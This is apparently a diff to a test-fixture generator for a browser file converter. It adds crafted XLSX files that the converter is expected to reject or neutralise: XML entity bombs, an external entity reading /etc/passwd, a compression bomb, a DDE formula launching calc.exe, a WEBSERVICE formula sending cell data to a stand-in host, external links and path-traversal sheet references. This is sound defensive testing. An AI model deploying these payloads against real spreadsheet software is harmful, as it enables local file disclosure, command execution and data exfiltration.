@@ -2665,6 +2665,180 @@ arch(
     "zip", node="succeeds", mismatch=True,
 )
 
+# --- workbooks: XLSX ------------------------------------------------------------------------------
+# A workbook is a ZIP of XML, so it inherits what goes wrong with both: bombs in the ZIP, bombs
+# in the XML, parts that point outside the file. And it has trouble of its own: formulas that
+# run programs, links to other people's servers, sheets that are hidden. Each is converted to
+# JSON.
+G = "workbooks"
+import zipfile as _zipfile
+
+NOT_BOOK = "This file is not a valid XLSX workbook"
+BOOK_TOO_BIG = "This workbook is too large to convert in a browser"
+SHEET_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
+
+
+def book_parts():
+    with _zipfile.ZipFile(os.path.join(FIXTURES, "xlsx/sample.xlsx")) as z:
+        return {name: z.read(name) for name in z.namelist()}
+
+
+def book(change=None, extra=None) -> bytes:
+    """The sample workbook with parts replaced (bytes), removed (None) or added."""
+    parts = book_parts()
+    for name, body in (change or {}).items():
+        if body is None:
+            parts.pop(name, None)
+        else:
+            parts[name] = body
+    parts.update(extra or {})
+    out = _io.BytesIO()
+    with _zipfile.ZipFile(out, "w", _zipfile.ZIP_DEFLATED) as z:
+        for name, body in parts.items():
+            info = _zipfile.ZipInfo(name, (2026, 11, 23, 12, 0, 0))
+            info.compress_type = _zipfile.ZIP_DEFLATED
+            z.writestr(info, body)
+    return out.getvalue()
+
+
+def sheet(rows: str, before: str = "") -> bytes:
+    return ('<?xml version="1.0"?>%s<worksheet xmlns="%s"><sheetData>%s</sheetData></worksheet>' % (before, SHEET_NS, rows)).encode()
+
+
+def text_cell(at, value):
+    return '<c r="%s" t="inlineStr"><is><t>%s</t></is></c>' % (at, value)
+
+
+def work(name, data, why, detect, **more):
+    trap(name, data, why, detect, group=G, **more)
+
+
+SAMPLE_BOOK = book()
+work(
+    "truncated.xlsx",
+    SAMPLE_BOOK[: len(SAMPLE_BOOK) // 2],
+    "A workbook cut off half-way. It is a ZIP, and the list of what it holds is at the end.",
+    "xlsx", node="fails", note=NOT_BOOK,
+)
+work(
+    "entity-bomb.xlsx",
+    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("A1", "name") + '</row><row r="2">' + text_cell("A2", "&a8;") + "</row>", "<!DOCTYPE l [" + xml_entities.decode() + "]>")}),
+    'The "billion laughs" inside a sheet: one cell that stands for a gigabyte of the letter a. '
+    "A workbook's XML never defines shorthand of its own, and one that does is refused.",
+    "xlsx", node="fails", note=NOT_BOOK,
+)
+work(
+    "reads-a-local-file.xlsx",
+    book({"xl/sharedStrings.xml": b'<?xml version="1.0"?><!DOCTYPE sst [<!ENTITY x SYSTEM "file:///etc/passwd">]><sst xmlns="' + SHEET_NS.encode() + b'"><si><t>&x;</t></si></sst>'}),
+    "The text shared between cells asks the reader to fetch a file from the computer and put "
+    "it in a cell.",
+    "xlsx", node="fails", note=NOT_BOOK,
+)
+work(
+    "bomb-inside.xlsx",
+    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("A1", "x") + "</row>" + " " * (300 * 1024 * 1024))}),
+    "A sheet of three hundred megabytes of spaces, packed into the workbook as 290 kilobytes.",
+    "xlsx", node="fails", note=BOOK_TOO_BIG,
+)
+work(
+    "formulas-that-run-programs.xlsx",
+    book({"xl/worksheets/sheet2.xml": sheet(
+        '<row r="1">' + text_cell("A1", "name") + text_cell("B1", "amount") + "</row>"
+        "<row r=\"2\">" + text_cell("A2", "Ada") + "<c r=\"B2\"><f>cmd|' /C calc.exe'!A0</f><v>0</v></c></row>"
+        '<row r="3">' + text_cell("A3", "Grace") + '<c r="B3" t="str"><f>WEBSERVICE("http://elsewhere.example/?"&amp;A2)</f><v>ok</v></c></row>'
+    )}),
+    "Two formulas: one that asks Windows to start a program, and one that sends a cell to "
+    "another site. Neither is worked out and neither is carried across; what is read is the "
+    "value each last showed.",
+    "xlsx", node="succeeds", absent="calc.exe",
+)
+work(
+    "linked-to-elsewhere.xlsx",
+    book(extra={
+        "xl/externalLinks/externalLink1.xml": b'<?xml version="1.0"?><externalLink xmlns="' + SHEET_NS.encode() + b'"><externalBook r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></externalLink>',
+        "xl/externalLinks/_rels/externalLink1.xml.rels": b'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath" Target="http://elsewhere.example/prices.xlsx" TargetMode="External"/></Relationships>',
+        "xl/vbaProject.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"macro" * 100,
+    }),
+    "A workbook that draws figures from a file on another site when it is opened, and carries "
+    "a macro. Neither part is ever opened.",
+    "xlsx", node="succeeds", absent="elsewhere.example",
+)
+work(
+    "every-sheet-hidden.xlsx",
+    book({"xl/workbook.xml": book_parts()["xl/workbook.xml"].replace(b'<sheet name="People"', b'<sheet name="People" state="hidden"').replace(b'<sheet name="Totals"', b'<sheet name="Totals" state="veryHidden"')}),
+    "A workbook in which every sheet is hidden. What is hidden is not what its owner meant to "
+    "hand over, and is not read.",
+    "xlsx", node="fails", note="This workbook has no rows in it",
+)
+work(
+    "sheet-is-outside-the-workbook.xlsx",
+    book({"xl/_rels/workbook.xml.rels": book_parts()["xl/_rels/workbook.xml.rels"].replace(b"worksheets/sheet2.xml", b"../../../../etc/passwd").replace(b"worksheets/sheet3.xml", b"../../x")}),
+    "The workbook says its sheets are files outside the workbook.",
+    "xlsx", node="fails", note=NOT_BOOK,
+)
+work(
+    "last-cell-of-the-sheet.xlsx",
+    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("XFD1", "far") + '</row><row r="2"><c r="XFD2"><v>1</v></c></row>')}),
+    "Valid: one value in the last column a sheet has, sixteen thousand columns from the first.",
+    "xlsx", node="succeeds",
+)
+work(
+    "cell-beyond-the-sheet.xlsx",
+    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("ZZZ1", "beyond") + '</row><row r="2"><c r="ZZZ2"><v>1</v></c></row>')}),
+    "A cell in a column past the last one a sheet has.",
+    "xlsx", node="fails", note=NOT_BOOK,
+)
+work(
+    "a-row-of-two-million-cells.xlsx",
+    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + "<c><v>1</v></c>" * 2_000_000 + "</row>")}),
+    "One row of two million cells, none of which says where it is.",
+    "xlsx", node="fails", note=NOT_BOOK,
+)
+work(
+    "dates-that-are-not-days.xlsx",
+    book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("A1", "when") + '</row><row r="2"><c r="A2" s="1"><v>-5</v></c></row><row r="3"><c r="A3" s="1"><v>1e300</v></c></row><row r="4"><c r="A4" s="1"><v>NaN</v></c></row>')}),
+    "Cells shown as dates whose numbers are no day there has been: minus five, a one with "
+    "three hundred noughts, and not a number at all. Each is left as what it is.",
+    "xlsx", node="succeeds",
+)
+work(
+    "no-list-of-sheets.xlsx",
+    book({"xl/workbook.xml": None}),
+    "A workbook with its sheets inside and without the part that lists them.",
+    "xlsx", node="fails", note=NOT_BOOK,
+)
+work(
+    "locked-with-a-password.xlsx",
+    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 16 + b"\x3e\x00\x03\x00\xfe\xff\x09\x00" + b"\0" * 480 + b"E\0n\0c\0r\0y\0p\0t\0e\0d\0P\0a\0c\0k\0a\0g\0e\0" + b"\0" * 480,
+    "A workbook locked with a password is not a ZIP at all: it is kept in an older kind of "
+    "container, scrambled. Recognised as that, and not converted.",
+    "unregistered",
+)
+work(
+    "picture-named.xlsx",
+    GOOD,
+    "A PNG with an .xlsx name.",
+    "png", node="succeeds", mismatch=True,
+)
+work(
+    "archive-named.xlsx",
+    GOOD_ZIP,
+    "An ordinary ZIP with an .xlsx name. A workbook is a ZIP, but a ZIP is not a workbook.",
+    "zip", node="succeeds", mismatch=True,
+)
+work(
+    "workbook-named.zip",
+    SAMPLE_BOOK,
+    "A sound workbook with a .zip name. It is converted as the workbook it is, not unpacked.",
+    "xlsx", node="succeeds", mismatch=True,
+)
+work(
+    "table-named.xlsx",
+    b"id,name\n1,Ada\n2,Grace\n",
+    "A CSV with an .xlsx name, as some programs save when asked for 'Excel'.",
+    "unknown",
+)
+
 with open(os.path.join(OUT, "manifest.json"), "w") as out:
     json.dump(manifest, out, indent=2)
     out.write("\n")
